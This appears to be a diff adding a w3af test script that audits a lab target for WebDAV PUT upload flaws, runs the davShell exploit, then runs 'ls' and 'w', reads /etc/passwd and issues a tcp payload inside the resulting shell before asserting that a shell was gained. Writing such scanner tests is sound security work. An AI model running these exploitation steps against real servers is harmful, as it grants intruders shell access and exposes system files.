@@ -1,0 +1,39 @@
+# This is a test for file uploads using PUT method, and the exploit of that issue
+
+plugins
+output console,textFile
+output config textFile
+set fileName output-w3af.txt
+set verbose True
+back
+output config console
+set verbose False
+back
+
+audit dav
+discovery serverHeader
+back
+
+target
+set target http://moth/w3af/audit/dav/
+back
+
+start
+
+exploit
+exploit davShell
+
+interact
+interact 0
+
+execute ls
+execute w
+read /etc/passwd
+payload tcp
+
+exit
+back
+assert len(kb.kb.getData('davShell','shell')) == 1
+
+exit
+
